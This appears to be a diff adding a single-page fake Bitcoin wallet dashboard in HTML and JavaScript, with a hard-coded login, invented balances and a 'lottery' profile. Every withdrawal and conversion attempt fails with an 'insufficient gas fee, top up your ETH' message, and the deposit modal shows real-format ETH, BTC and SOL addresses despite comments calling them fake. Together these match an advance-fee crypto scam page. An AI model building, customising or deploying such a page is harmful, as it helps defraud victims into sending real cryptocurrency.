@@ -1,0 +1,784 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Invest Dashboard — Crypto</title>
+<style>
+  :root { --bg:#050609; --panel:#090b11; --line:#252832; --text:#f5f7fb; --muted:#a6abb8; --green:#20d66b; --blue:#1749d8; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--text); font:16px/1.4 Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,Arial,sans-serif; }
+  button,input { font:inherit; }
+  button { cursor:pointer; color:inherit; }
+  .demo-banner { background:#302407; color:#ffd56a; text-align:center; padding:7px 12px; font-size:12px; letter-spacing:.08em; font-weight:800; }
+  .wrap { max-width:1050px; margin:auto; padding:20px; }
+  .top { display:flex; justify-content:space-between; align-items:center; gap:16px; border-bottom:1px solid #1b1d24; padding-bottom:18px; }
+  .brand { font-size:34px; font-weight:800; letter-spacing:-1.5px; display:flex; align-items:center; gap:10px; }
+  .bitcoin-logo { width:1.05em; height:1.05em; flex:0 0 auto; display:inline-grid; place-items:center; border-radius:50%; background:#f7931a; color:#fff; font-family:Arial,sans-serif; font-size:.86em; font-weight:800; line-height:1; letter-spacing:0; box-shadow:0 2px 8px #f7931a35; }
+  .login-brand { margin-bottom:22px; }
+  .login-brand .bitcoin-logo { font-size:29px; width:36px; height:36px; }
+  .top .brand .bitcoin-logo { font-size:29px; width:36px; height:36px; }
+  .top-right { display:flex; align-items:center; gap:14px; }
+  .profile { display:flex; align-items:center; gap:11px; }
+  .avatar { width:56px; height:56px; display:grid; place-items:center; border-radius:50%; background:linear-gradient(135deg,#a23ad0,#193ed1); font-size:26px; font-weight:700; border:2px solid #5740a0; }
+  .name { font-weight:700; }
+  .sub { color:#c3a6d9; font-size:13px; }
+  .vip { display:inline-block; color:#ffd66a; border:1px solid #8e6b26; border-radius:20px; padding:2px 10px; margin-top:5px; font-size:11px; }
+  .outline { background:transparent; border:1px solid var(--line); border-radius:12px; padding:10px 13px; }
+  .date-row { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px; margin:18px 0 24px; }
+  .date-card { border:1px solid var(--line); border-radius:12px; padding:10px 14px; color:var(--muted); font-size:13px; }
+  .date-card strong { color:#73ec8b; display:block; font-size:15px; }
+  .market { color:#d3d7df; border:1px solid var(--line); padding:7px 12px; border-radius:24px; font-size:12px; }
+  .dot { color:#22e77b; }
+  .balance-head { text-align:center; margin:10px 0 24px; }
+  .eyebrow { color:#aeb2bc; font-size:14px; letter-spacing:.03em; }
+  .big-balance { font-size:clamp(36px,6vw,64px); line-height:1.12; font-weight:750; letter-spacing:-1.8px; margin:4px 0; }
+  .currency { font-size:16px; font-weight:500; color:#d1d5de; letter-spacing:0; }
+  .gain { color:#51d86d; }
+  .coin-card { border:1px solid #35302a; background:linear-gradient(110deg,#0b0b0d,#07080c); border-radius:18px; padding:20px; display:grid; grid-template-columns:auto 1fr minmax(120px, .8fr); align-items:center; gap:18px; margin:0 auto 18px; max-width:930px; }
+  .coin-icon { width:62px; height:62px; display:grid; place-items:center; background:#f7931a; border-radius:50%; font-size:40px; font-weight:700; color:white; }
+  .label { color:#c4c8d2; font-size:14px; }
+  .coin-number { font-size:25px; font-weight:700; margin:2px 0 4px; }
+  .mini-chart { width:100%; max-width:190px; height:56px; }
+  .coin-right { text-align:right; color:#d1d4dc; font-size:14px; }
+  .actions { display:grid; grid-template-columns:repeat(3,minmax(0,1fr)); gap:14px; margin:18px 0; }
+  .action { min-height:86px; border-radius:17px; border:1px solid var(--line); padding:17px 20px; display:flex; align-items:center; gap:14px; text-align:left; }
+  .action .symbol { font-size:34px; line-height:1; }
+  .action strong { display:block; font-size:18px; font-weight:650; }
+  .action small { color:#d3d6df; display:block; margin-top:3px; }
+  .green-btn { background:linear-gradient(110deg,#0ca94c,#087b39); border-color:#1ac05b; }
+  .dark-btn { background:#080a10; }
+  /* EDITABLE ACTION COLORS: Withdraw = blue; Convert Crypto = light yellow. */
+  .withdraw-action { background:linear-gradient(110deg,#1677ff,#0755c9); border-color:#438fff; color:#fff; }
+  .convert-action { background:linear-gradient(110deg,#fff4b8,#ffe783); border-color:#e6ce69; color:#29230b; }
+  .convert-action .symbol, .convert-action strong { color:#29230b; }
+  .convert-action small { color:#655a2c; }
+  body.light-mode .withdraw-action { background:linear-gradient(110deg,#1677ff,#0755c9); border-color:#438fff; color:#fff; }
+  body.light-mode .withdraw-action small { color:#eaf2ff; }
+  body.light-mode .convert-action { background:linear-gradient(110deg,#fff4b8,#ffe783); border-color:#e6ce69; color:#29230b; }
+  body.light-mode .convert-action small { color:#655a2c; }
+  h2 { font-size:23px; margin:22px 0 0; font-weight:650; }
+  .section-sub { color:var(--muted); margin:2px 0 14px; }
+  .tiles { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
+  .tile { min-height:130px; border:1px solid #333846; border-radius:17px; padding:17px; display:flex; align-items:flex-start; gap:14px; position:relative; overflow:hidden; }
+  .tile-icon { font-size:30px; min-width:38px; }
+  .tile h3 { margin:0 0 4px; font-size:17px; font-weight:650; }
+  .tile p { color:#d0d4df; margin:0; font-size:13px; }
+  .tile.blue { background:linear-gradient(120deg,#1746c5,#061b64); }
+  .tile.orange { background:linear-gradient(120deg,#fa6a00,#9b3000); }
+  .tile.green { background:#050a08; border-color:#287643; }
+  .tile .arrow { margin-left:auto; font-size:25px; color:#b9c8ff; }
+  .live { background:#178a4b; padding:3px 8px; border-radius:5px; font-size:12px; margin-left:auto; }
+  .stats { display:flex; gap:0; margin-top:12px; padding-top:9px; border-top:1px solid #24372c; width:100%; }
+  .stats span { flex:1; font-size:11px; color:#d1d5dc; border-right:1px solid #28312d; padding:0 6px; }
+  .stats span:last-child { border:0; }
+  .stats b { display:block; color:#73e78c; font-size:14px; }
+  .account { border:1px solid var(--line); border-radius:18px; margin-top:18px; padding:18px 20px; }
+  .account-head { display:flex; justify-content:space-between; gap:10px; color:#d1d5df; margin-bottom:10px; }
+  .rowline { display:flex; justify-content:space-between; gap:12px; padding:12px 0; border-bottom:1px solid #20232b; color:#d0d3dc; }
+  .rowline strong { color:#f6f7fb; font-size:18px; }
+  .rowline .gain { color:#5cdb73; }
+  .coin-small { display:flex; align-items:center; gap:12px; padding-top:13px; }
+  .coin-small .coin-icon { width:42px; height:42px; font-size:27px; }
+  .coin-small .right { margin-left:auto; text-align:right; }
+  .foot { text-align:center; color:#747b8a; font-size:12px; padding:20px 0 6px; }
+  .hidden { display:none !important; }
+  .login-screen { min-height:100vh; display:grid; place-items:center; padding:20px; background:radial-gradient(ellipse at top,#10234b 0%,#050609 55%); }
+  .login-card { width:min(420px,100%); border:1px solid #292d39; border-radius:22px; padding:28px; background:#090b12; box-shadow:0 24px 80px #0008; }
+  .login-card h1 { margin:0 0 6px; font-size:30px; }
+  .login-card p { color:var(--muted); margin:0 0 22px; }
+  .field { display:block; color:#cbd0dc; font-size:13px; margin:14px 0 6px; }
+  input { width:100%; padding:13px 14px; border:1px solid #343846; border-radius:10px; color:white; background:#05060a; outline:none; }
+  input:focus { border-color:#4375ff; }
+  .primary { width:100%; border:0; border-radius:11px; padding:13px; margin-top:18px; background:#1755e8; color:white; font-weight:750; }
+  .hint { font-size:12px; color:#858c9b; margin-top:12px; }
+  .loader { text-align:center; padding:18px 0 6px; }
+  .spinner { width:38px; height:38px; border:4px solid #29344e; border-top-color:#4d7fff; border-radius:50%; animation:spin .8s linear infinite; margin:0 auto 12px; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .modal-backdrop { position:fixed; inset:0; background:#000b; display:grid; place-items:center; padding:20px; z-index:5; }
+  .modal { width:min(440px,100%); background:#0b0d14; border:1px solid #343846; border-radius:18px; padding:22px; }
+  .modal h2 { margin:0 0 10px; }
+  .modal-actions { display:flex; gap:10px; }
+  .modal-actions button { flex:1; }
+  .secondary { background:#171a24; border:1px solid #343846; border-radius:10px; padding:11px; }
+  /* Appearance option controlled from Settings; default remains the original dark design. */
+  body.light-mode {
+    --bg:#f4f6fb; --panel:#ffffff; --line:#d8deea; --text:#182033; --muted:#667085;
+    background:var(--bg); color:var(--text);
+  }
+  body.light-mode .demo-banner { background:#fff1c2; color:#775400; }
+  body.light-mode .top { border-bottom-color:#dce1eb; }
+  body.light-mode .sub { color:#6b4c85; }
+  body.light-mode .date-card, body.light-mode .market,
+  body.light-mode .outline, body.light-mode .action,
+  body.light-mode .account { border-color:#d8deea; }
+  body.light-mode .date-card { color:#667085; }
+  body.light-mode .date-card strong { color:#16803d; }
+  body.light-mode .market { color:#344054; }
+  body.light-mode .eyebrow, body.light-mode .currency,
+  body.light-mode .label, body.light-mode .coin-right,
+  body.light-mode .account-head, body.light-mode .rowline,
+  body.light-mode .action small { color:#475467; }
+  body.light-mode .coin-card { background:linear-gradient(110deg,#fff,#f1f4fa); border-color:#d8deea; }
+  body.light-mode .dark-btn { background:#e9edf5; }
+  body.light-mode .tile.green { background:#eefaf1; border-color:#a9d9b7; }
+  body.light-mode .tile p, body.light-mode .stats span { color:#344054; }
+  body.light-mode .rowline { border-bottom-color:#e4e7ec; }
+  body.light-mode .rowline strong { color:#182033; }
+  body.light-mode .foot { color:#667085; }
+  body.light-mode .login-screen { background:radial-gradient(ellipse at top,#e1eaff 0%,#f4f6fb 65%); }
+  body.light-mode .login-card, body.light-mode .modal { background:#fff; border-color:#d8deea; box-shadow:0 24px 80px #10182820; }
+  body.light-mode .login-card p, body.light-mode .modal p { color:#475467 !important; }
+  body.light-mode .field { color:#344054; }
+  body.light-mode input, body.light-mode select { color:#182033 !important; background:#fff !important; border-color:#cbd2df !important; }
+  body.light-mode .secondary { color:#182033; background:#f2f4f7; border-color:#d0d5dd; }
+  .withdraw-page { max-width:560px; margin:32px auto; padding:24px; border:1px solid var(--line); border-radius:20px; background:var(--panel); }
+  .withdraw-page h1 { margin:0 0 8px; font-size:28px; }
+  .withdraw-page .intro { color:var(--muted); margin:0 0 20px; }
+  .withdraw-page .field { margin-top:16px; }
+  .withdraw-page select { width:100%; padding:13px 14px; border:1px solid #343846; border-radius:10px; color:white; background:#05060a; font:inherit; }
+  .withdraw-page .withdraw-submit { width:100%; border:0; border-radius:11px; padding:14px; margin-top:22px; background:linear-gradient(110deg,#0ca94c,#087b39); color:white; font-weight:750; }
+  .withdraw-page .back-btn { margin-bottom:18px; }
+  body.light-mode .withdraw-page select { color:#182033; background:#fff; border-color:#cbd2df; }
+  @media (max-width:650px) { .withdraw-page { margin:18px auto; padding:18px; } }
+  .settings-group { margin-top:18px; }
+  .settings-label { display:block; margin-bottom:9px; color:var(--muted); font-size:13px; font-weight:700; }
+  .settings-row { display:flex; align-items:center; justify-content:space-between; gap:12px; }
+  .settings-row button { min-width:48px; }
+  .settings-value { min-width:72px; text-align:center; font-weight:700; }
+  .appearance-toggle { width:100%; text-align:left; border:1px solid var(--line); border-radius:12px; padding:13px; background:transparent; }
+  @media (max-width:650px) {
+    .wrap { padding:14px; }
+    .top { align-items:flex-start; }
+    .brand { font-size:29px; }
+    .top-right { gap:8px; }
+    .profile { gap:7px; }
+    .avatar { width:45px; height:45px; font-size:21px; }
+    .profile .sub,.vip { display:none; }
+    .outline { padding:8px; font-size:13px; }
+    .coin-card { grid-template-columns:auto 1fr; gap:12px; padding:14px; }
+    .coin-right { grid-column:2; text-align:left; }
+    .mini-chart { display:none; }
+    .actions,.tiles { grid-template-columns:1fr; gap:10px; }
+    .action { min-height:78px; }
+    .tile { min-height:115px; }
+    .big-balance { letter-spacing:-1px; }
+    .account { padding:14px; }
+    .rowline strong { font-size:16px; }
+  }
+</style>
+</head>
+<body>
+<div id="loginScreen" class="login-screen">
+  <form class="login-card" id="loginForm">
+    <div class="brand login-brand"><span class="bitcoin-logo" aria-label="Bitcoin logo">₿</span><span>Bitcoin<span style="color:#3474ff"></span></span></div>
+    <h1>Welcome </h1>
+    <p>Sign in to your bitcoin wallet.</p>
+    <label class="field" for="email">Email or username</label>
+    <input id="email" autocomplete="username" placeholder="email / username" required>
+    <label class="field" for="password">Password</label>
+    <input id="password" type="password" autocomplete="current-password" placeholder="Enter  password" required>
+    <button class="primary" type="submit" id="loginButton">Sign in</button>
+    <div id="loading" class="loader hidden" aria-live="polite">
+      <div class="spinner"></div><strong>Loading your dashboard…</strong>
+      <div class="hint">Please wait....</div>
+    </div>
+    <div id="loginError" class="hint" role="alert" style="color:#ff7777"></div>
+  </form>
+</div>
+
+<div id="dashboard" class="hidden">
+  <div class="demo-banner">WELCOME BACK</div>
+  <main class="wrap">
+    <header class="top">
+        <div class="brand login-brand"><span class="bitcoin-logo" aria-label="Bitcoin logo">₿</span><span>Bitcoin<span style="color:#3474ff"></span></span></div>
+      <div class="top-right">
+        <div class="profile">
+          <div class="avatar" id="avatar">H</div>
+          <div><div class="name" id="profileName">Ravi Koya <span style="color:#4595ff">✓</span></div><div class="sub" id="profileRole">Lottery Platforms </div><div class="vip">♛ </div></div>
+        </div>
+        <button class="outline" id="settingsBtn">⚙ Settings</button>
+        <button class="outline" id="logoutBtn" title="Log out of the demo">↪ Logout</button>
+      </div>
+    </header>
+    <div class="date-row">
+      <div class="date-card">▦ Today's Date<strong id="todayDate">October 12, 2026</strong></div>
+      <div class="market"><span class="dot">●</span> Wallet active <span style="color:#7f8592"> </span></div>
+    </div>
+    <section class="balance-head">
+      <div class="eyebrow">AVAILABLE BALANCE</div>
+      <div class="big-balance"><span id="totalBalance">$29,709.00</span> <span class="currency">USD</span></div>
+      <div class="gain" id="totalGain">+$23.00 (+0.00%) &nbsp; ⓘ</div>
+    </section>
+
+    <section class="coin-card">
+      <div class="coin-icon">₿</div>
+      <div>
+        <div class="label">BITCOIN VALUE <span style="color:#818796;font-size:11px"></span></div>
+        <div class="coin-number" id="btcAmount">3.268287 BTC</div>
+        <div class="gain">+$2,431.21 (+1.45%)</div>
+      </div>
+      <div class="coin-right">
+        <svg class="mini-chart" viewBox="0 0 190 56" role="img" aria-label="Decorative upward chart"><polyline points="2,45 12,36 20,40 29,27 37,34 47,22 57,29 66,15 76,24 88,18 98,27 108,12 118,19 129,10 140,14 150,4 160,13 170,2 188,0" fill="none" stroke="#4fd879" stroke-width="2.2"/></svg>
+        <div>≈ <span id="btcValue">$—</span> USD</div>
+        <div class="label" id="btcMarketPrice" style="margin-top:5px">BTC market price: Loading…</div>
+        <div class="gain" style="margin-top:5px">↗ +1.45%</div>
+      </div>
+    </section>
+
+    <section class="actions">
+      <button class="action green-btn" id="addMoneyBtn"><span class="symbol">＋</span><span><strong>Deposit</strong><small>Make a deposit to your wallet</small></span></button>
+      <button class="action withdraw-action" id="withdrawBtn"><span class="symbol">⬇</span><span><strong>Withdraw</strong><small>Make a withdrawal</small></span></button>
+      <button class="action convert-action" id="convertCryptoBtn"><span class="symbol">⇄</span><span><strong>Convert Crypto</strong><small>Converts between crypto assets</small></span></button>
+    </section>
+
+    <h2>Quick Actions</h2>
+    <div class="section-sub"> </div>
+    <section class="tiles">
+      <button class="tile blue" id="addFundsBtn"><span class="tile-icon">💰</span><span><h3>Deposit</h3><p>Make a deposit to your  wallet</p></span><span class="arrow">›</span></button>
+      <button class="tile blue" id="withdrawFundsBtn"><span class="tile-icon">🔄</span><span><h3>Withdraw Funds</h3><p>Withdraw from available balance</p></span><span class="arrow">›</span></button>
+      <button class="tile orange" id="profitBtn"><span class="tile-icon">📊</span><span><h3>Profit Cycle</h3><p>View a profit analytics and performance</p></span><span class="arrow">›</span></button>
+      <button class="tile green" id="copyTradesBtn"><span class="tile-icon">🟢</span><span style="flex:1"><h3>Trader Preview</h3><p>Preview trading strategy stats —  live trading</p></span><span class="live">Preview</span><span class="arrow">›</span></button>
+    </section>
+
+    <section class="account">
+      <div class="account-head"><strong>💳 ACCOUNT BALANCE</strong><span>▦ <span id="accountDate">October 12, 2026</span></span></div>
+      <div class="rowline"><span>Available Balance</span><strong class="gain" id="availableBalance">$191,007.00</strong></div>
+      <div class="rowline"><span>Investment amount</span><strong id="investmentAmount">$15,975.00</strong></div>
+      <div class="coin-small">
+        <div class="coin-icon">₿</div><div><div>Bitcoin Value</div><div class="label" id="btcAmountSmall">3.268287 BTC</div></div>
+        <div class="right"><div>≈ <span id="btcValueSmall">$—</span> USD</div><div class="gain">Live BTC valuation</div></div>
+      </div>
+    </section>
+    <div class="foot">2026 copyrights.</div>
+  </main>
+</div>
+
+<div id="withdrawPage" class="hidden">
+  <main class="wrap">
+    <section class="withdraw-page">
+      <button type="button" class="outline back-btn" id="backToDashboard">← Back </button>
+      <h1>Withdraw Funds</h1>
+      <p class="intro">Enter the withdrawal details below, Please make sure that your withdrawal address and network match each others, otherwise you may lose your assets.</p>
+      <form id="withdrawForm">
+        <label class="field" for="walletAddress">Wallet</label>
+        <input id="walletAddress" name="walletAddress" placeholder="Enter recipient wallet address" required autocomplete="off">
+        <label class="field" for="withdrawAmount">Amount to be sent (USD)</label>
+        <input id="withdrawAmount" name="withdrawAmount" type="number" min="1000" max="50000" step="0.01" placeholder="Enter $1,000–$50,000" required>
+        <p class="hint" style="margin:7px 0 0">Minimum: $1,000 · Maximum: $50,000 per transaction.</p>
+        <!-- EDITABLE ESTIMATED WITHDRAWAL FEE DISPLAY: adjust these styles directly in the source. -->
+        <div id="withdrawFeeBox" style="margin-top:4px;padding:3px 5px;border:1px solid var(--line);border-radius:6px;background:var(--panel);max-width:100%">
+          <div style="font-weight:700;font-size:9px;line-height:1.15">Estimated withdrawal fee</div>
+          <div id="withdrawFeeValue" style="margin-top:1px;font-size:10px;font-weight:800;line-height:1.15;color:#21b66b">0.05 ETH</div>
+          <p id="withdrawFeeRange" class="hint" style="margin:1px 0 0;font-size:8px;line-height:1.15">For transactions from $1,000 to $9,999.99</p>
+        </div>
+        <label class="field" for="withdrawNetwork">Network</label>
+        <select id="withdrawNetwork" name="withdrawNetwork" required>
+          <option value="">Select wallet network</option>
+          <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+          <option value="Ethereum (ERC-20)">Ethereum (ERC-20)</option>
+          <option value="Tether (USDT - TRC-20)">Tether (USDT - TRC-20)</option>
+          <option value="Tether (USDT - ERC-20)">Tether (USDT - ERC-20)</option>
+          <option value="Solana (SOL)">Solana (SOL)</option>
+        </select>
+        <button class="withdraw-submit" type="submit">Send</button>
+        <p class="hint" id="withdrawFeedback" role="status"></p>
+      </form>
+      <section id="withdrawUnavailableSection" class="hidden" aria-live="polite">
+        <div style="margin-top:22px;padding:18px;border:1px solid #7d3535;border-radius:14px;background:#241010">
+          <h2 style="margin:0 0 10px;color:#ff8888">Withdrawal Unsuccessful</h2>
+          <p style="margin:0;color:#f1d0d0">NOTE: insufficient gas fee to complete your transaction, Kindly top up your (ETH) and try your withdrawal again.</p>
+          <button type="button" class="secondary" id="withdrawUnavailableBack" style="margin-top:16px;width:100%">Back </button>
+        </div>
+      </section>
+    </section>
+  </main>
+</div>
+
+<div id="conversionPage" class="hidden">
+  <main class="wrap">
+    <section class="withdraw-page">
+      <button type="button" class="outline back-btn" id="conversionBackBtn">← Back </button>
+      <h1>Convert Crypto</h1>
+      <p class="intro">Choose the crypto assets and amount.</p>
+      <form id="conversionForm">
+        <label class="field" for="conversionAmount">Transaction amount (USD)</label>
+        <input id="conversionAmount" name="conversionAmount" type="number" min="1000" max="50000" step="0.01" placeholder="Enter $1,000–$50,000" required>
+        <p class="hint" style="margin:7px 0 0">Minimum: $1,000 · Maximum: $50,000 per transaction, for all listed assets.</p>
+        <label class="field" for="conversionFrom">Convert from</label>
+        <select id="conversionFrom" name="conversionFrom" required>
+          <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+          <option value="Ethereum (ETH)">Ethereum (ETH)</option>
+          <option value="Tether (USDT - TRC-20)">Tether (USDT - TRC-20)</option>
+          <option value="Tether (USDT - ERC-20)">Tether (USDT - ERC-20)</option>
+          <option value="Solana (SOL)">Solana (SOL)</option>
+        </select>
+        <label class="field" for="conversionTo">Convert to</label>
+        <select id="conversionTo" name="conversionTo" required>
+          <option value="Ethereum (ETH)">Ethereum (ETH)</option>
+          <option value="Bitcoin (BTC)">Bitcoin (BTC)</option>
+          <option value="Tether (USDT - TRC-20)">Tether (USDT - TRC-20)</option>
+          <option value="Tether (USDT - ERC-20)">Tether (USDT - ERC-20)</option>
+          <option value="Solana (SOL)">Solana (SOL)</option>
+        </select>
+        <!-- EDITABLE DEMO CONVERSION FEE DISPLAY: edit styles here in the source. -->
+        <div id="conversionFeeBox" style="margin-top:8px;padding:4px 6px;border:1px solid var(--line);border-radius:6px;background:var(--panel);max-width:100%">
+          <div style="font-weight:700;font-size:9px;line-height:1.15">Estimated conversion fee (demo)</div>
+          <div id="conversionFeeValue" style="margin-top:1px;font-size:10px;font-weight:800;line-height:1.15;color:#21b66b">0.05 ETH</div>
+          <p id="conversionFeeRange" class="hint" style="margin:1px 0 0;font-size:8px;line-height:1.15">For transactions from $1,000 to $9,999.99</p>
+        </div>
+        <button class="withdraw-submit" type="submit" id="conversionSubmitBtn">Convert</button>
+        <p class="hint" id="conversionFeedback" role="status"></p>
+      </form>
+      <section id="conversionResult" class="hidden" aria-live="polite">
+        <div style="margin-top:18px;padding:15px;border:1px solid #287643;border-radius:12px;background:#07160d">
+          <h2 style="margin:0 0 8px;color:#51d86d;font-size:20px">Conversion Preview</h2>
+          <p id="conversionResultText" style="margin:0;color:var(--text)"></p>
+          <p style="margin:8px 0 0;color:var(--muted);font-size:12px">NOTE: you have insufficient gas fee, kindly top up your (ETH) and try again.</p>
+          <button type="button" class="secondary" id="conversionEditBtn" style="margin-top:14px;width:100%">Back</button>
+        </div>
+      </section>
+    </section>
+  </main>
+</div>
+
+<div id="modalBackdrop" class="modal-backdrop hidden" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+  <div class="modal">
+    <h2 id="modalTitle">Demo action</h2>
+    <p id="modalText" style="color:#aeb4c2">This action is simulated.</p>
+    <div id="modalInputWrap" class="hidden">
+      <label class="field" for="amountInput">Amount (USD)</label>
+      <input id="amountInput" type="number" min="1" step="0.01" placeholder="100.00">
+    </div>
+    <div id="depositAddressWrap" class="hidden">
+      <label class="field" for="depositAddress">Deposit address</label>
+      <div style="display:flex;gap:8px;align-items:stretch">
+        <input id="depositAddress" value="BTC-ADDRESS-NOT-VALID" readonly aria-label="Deposit address">
+        <button type="button" class="secondary" id="copyDepositAddress">Copy</button>
+      </div>
+      <p class="hint">minimum deposit 0.0015 btc.</p>
+      <label class="field" for="depositNetwork">Network</label>
+      <select id="depositNetwork" style="width:100%;padding:12px;border:1px solid #343846;border-radius:10px;color:white;background:#05060a">
+          <option value="ethereum">Ethereum (ETH)</option>
+          <option value="bitcoin">Bitcoin (BTC)</option>
+          <option value="solana">Solana (SOL)</option>
+
+
+      </select>
+    </div>
+    <div id="settingsControls" class="hidden">
+      <div class="settings-group">
+        <span class="settings-label">Dashboard zoom</span>
+        <div class="settings-row">
+          <button type="button" class="secondary" id="zoomOutBtn" aria-label="Zoom out">−</button>
+          <span class="settings-value" id="zoomLevel">100%</span>
+          <button type="button" class="secondary" id="zoomInBtn" aria-label="Zoom in">＋</button>
+          <button type="button" class="secondary" id="zoomResetBtn">Reset</button>
+        </div>
+      </div>
+      <div class="settings-group">
+        <span class="settings-label">Appearance</span>
+        <button type="button" class="appearance-toggle" id="appearanceBtn">🌙 Switch to light mode</button>
+      </div>
+    </div>
+    <div class="modal-actions" style="margin-top:20px">
+      <button class="secondary" id="cancelModal">Cancel</button>
+      <button class="primary" style="margin-top:0" id="confirmModal">Continue</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  // EDIT THESE LOGIN DETAILS to choose the username and password for this local demo.
+  // This is client-side demo authentication only; do not use real or sensitive passwords.
+  const LOGIN_CREDENTIALS = {
+    username: "Patrick604",
+    password: "c"
+  };
+
+  // EDIT THESE DEFAULTS to customize the demo dashboard.
+  const DEFAULTS = {
+    profileName: "Ravi Koya",
+    profileRole: "User ",
+    avatar: "R",
+    totalBalance: 80000.00,
+    availableBalance: 80000.00,
+    investmentAmount: 750.00,
+    btcAmount: "1.00 BTC"
+  };
+
+  // EDIT THESE DEMO PLACEHOLDERS to customize each network's displayed address.
+  // These are intentionally NOT real wallet addresses. Never use them for transfers.
+  const DEMO_DEPOSIT_ADDRESSES = {
+    ethereum:  "0x91f6e48479d2acb32d819848a6350200d82910d4",
+     bitcoin: "bc1qj92cfgrzsrfr4d2p6uh5nv9pt795lxs0ajypny",
+     solana: "23usmejPnpcdv8HFyGvnrRzLYmqsUPFTUYAathsx7cbV",
+  };
+
+  const $ = (id) => document.getElementById(id);
+  let state = { ...DEFAULTS };
+  let currentAction = null;
+  let liveBtcPrice = null;
+
+  function money(n) {
+    return new Intl.NumberFormat("en-US", { style:"currency", currency:"USD", minimumFractionDigits:2 }).format(n);
+  }
+  function render() {
+    $("profileName").innerHTML = `${escapeHTML(state.profileName)} <span style="color:#4595ff">✓</span>`;
+    $("profileRole").textContent = state.profileRole;
+    $("avatar").textContent = state.avatar || state.profileName.trim().slice(0,1).toUpperCase() || "U";
+    $("totalBalance").textContent = money(state.totalBalance);
+    $("availableBalance").textContent = money(state.availableBalance);
+    $("investmentAmount").textContent = money(state.investmentAmount);
+    const btcQuantity = Number.parseFloat(String(state.btcAmount).replace(/[^0-9.]/g, "")) || 0;
+    if (liveBtcPrice !== null) {
+      const btcValuation = btcQuantity * liveBtcPrice;
+      $("btcValue").textContent = money(btcValuation);
+      $("btcValueSmall").textContent = money(btcValuation);
+      $("btcMarketPrice").textContent = `BTC market price: ${money(liveBtcPrice)} USD`;
+    }
+    $("btcAmount").textContent = state.btcAmount;
+    $("btcAmountSmall").textContent = state.btcAmount;
+  }
+  function escapeHTML(s) {
+    return String(s).replace(/[&<>"']/g, c => ({ "&":"&amp;", "<":"&lt;", ">":"&gt;", '"':"&quot;", "'":"&#39;" }[c]));
+  }
+  function showModal(title, text, action, input=false) {
+    currentAction = action;
+    $("modalTitle").textContent = title;
+    $("modalText").textContent = text;
+    $("modalInputWrap").classList.toggle("hidden", !input);
+    $("depositAddressWrap").classList.toggle("hidden", action !== "deposit");
+    $("settingsControls").classList.toggle("hidden", action !== "settings");
+    $("confirmModal").textContent = action === "settings" ? "Done" : action === "deposit" ? "Done" : input ? "Confirm demo amount" : "Got it";
+    $("amountInput").value = "";
+    $("modalBackdrop").classList.remove("hidden");
+  }
+  function closeModal() { $("modalBackdrop").classList.add("hidden"); }
+  function updateDemoDepositAddress() {
+    const network = $("depositNetwork").value;
+    $("depositAddress").value = DEMO_DEPOSIT_ADDRESSES[network] || "DEMO-ADDRESS-NOT-VALID";
+    $("copyDepositAddress").textContent = "Copy";
+  }
+
+  function beginAmountAction(action) {
+    if (action === "add") {
+      showModal(
+        "Make a deposit",
+        "Please make sure that your deposits address and chain match each other, otherwise you may lose your assets!",
+        "deposit",
+        false
+      );
+      $("depositAddressWrap").classList.remove("hidden");
+      updateDemoDepositAddress();
+      $("confirmModal").textContent = "Done";
+      return;
+    }
+    showModal(
+      "Withdrawals Pending.",
+      "Kindly Make your first deposit to activate your lottery withrawal, and try again.",
+      "info"
+    );
+  }
+
+  // Pull the current BTC/USD market price from CoinGecko and refresh once per minute.
+  async function refreshBitcoinPrice() {
+    const priceLabel = $("btcMarketPrice");
+    try {
+      const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd", { cache: "no-store" });
+      if (!response.ok) throw new Error(`Price service returned ${response.status}`);
+      const data = await response.json();
+      const price = Number(data?.bitcoin?.usd);
+      if (!Number.isFinite(price) || price <= 0) throw new Error("Invalid BTC price");
+      liveBtcPrice = price;
+      render();
+    } catch (error) {
+      if (priceLabel) priceLabel.textContent = "BTC market price unavailable — check internet connection";
+      console.warn("Unable to refresh BTC market price:", error);
+    }
+  }
+  refreshBitcoinPrice();
+  setInterval(refreshBitcoinPrice, 60000);
+
+  $("loginForm").addEventListener("submit", (e) => {
+    e.preventDefault();
+    const enteredUsername = $("email").value.trim();
+    const enteredPassword = $("password").value;
+    const error = $("loginError");
+
+    if (enteredUsername !== LOGIN_CREDENTIALS.username || enteredPassword !== LOGIN_CREDENTIALS.password) {
+      error.textContent = "Incorrect username or password.";
+      return;
+    }
+
+    error.textContent = "";
+    $("loginButton").classList.add("hidden");
+    $("loading").classList.remove("hidden");
+    // Demo-only: credentials are checked locally in this browser; no server is involved.
+    setTimeout(() => {
+      $("loginScreen").classList.add("hidden");
+      $("dashboard").classList.remove("hidden");
+      const now = new Date();
+      const date = now.toLocaleDateString("en-US", { month:"long", day:"numeric", year:"numeric" });
+      $("todayDate").textContent = date;
+      $("accountDate").textContent = date;
+      render();
+    }, 5000);
+  });
+  let dashboardZoom = Number(localStorage.getItem("cryptoInvestDashboardZoom")) || 100;
+  function applyDashboardZoom() {
+    dashboardZoom = Math.max(70, Math.min(130, dashboardZoom));
+    $("dashboard").style.zoom = `${dashboardZoom}%`;
+    $("zoomLevel").textContent = `${dashboardZoom}%`;
+    localStorage.setItem("cryptoInvestDashboardZoom", String(dashboardZoom));
+  }
+  function applyAppearance() {
+    const lightMode = document.body.classList.contains("light-mode");
+    $("appearanceBtn").textContent = lightMode ? "☀️ Switch to dark mode" : "🌙 Switch to light mode";
+    localStorage.setItem("cryptoInvestAppearance", lightMode ? "light" : "dark");
+  }
+  if (localStorage.getItem("cryptoInvestAppearance") === "light") document.body.classList.add("light-mode");
+  applyAppearance();
+  applyDashboardZoom();
+  $("settingsBtn").addEventListener("click", () => {
+    showModal("Settings", "Adjust dashboard zoom and appearance.", "settings");
+    applyDashboardZoom();
+    applyAppearance();
+  });
